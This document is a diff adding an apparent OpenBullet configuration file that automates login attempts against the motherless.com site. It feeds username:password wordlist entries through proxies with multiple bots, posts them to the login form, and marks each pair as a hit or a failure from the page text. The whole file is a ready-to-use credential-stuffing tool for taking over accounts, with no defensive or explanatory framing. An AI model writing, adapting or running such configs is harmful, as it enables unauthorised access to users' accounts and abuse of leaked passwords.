@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Motherless",
+  "SuggestedBots": 20,
+  "LastModified": "2018-08-09T02:58:16.061567+00:00",
+  "AdditionalInfo": "Bots is just a guess",
+  "Author": "PepeLeSpooder",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Getter REQUEST GET "https://motherless.com" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+REQUEST POST "https://motherless.com/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&__remember_me=0&botcheck=no+bots%21" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://motherless.com" 
+  HEADER "referer: https://motherless.com/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Success OR 
+    KEY "Profile" 
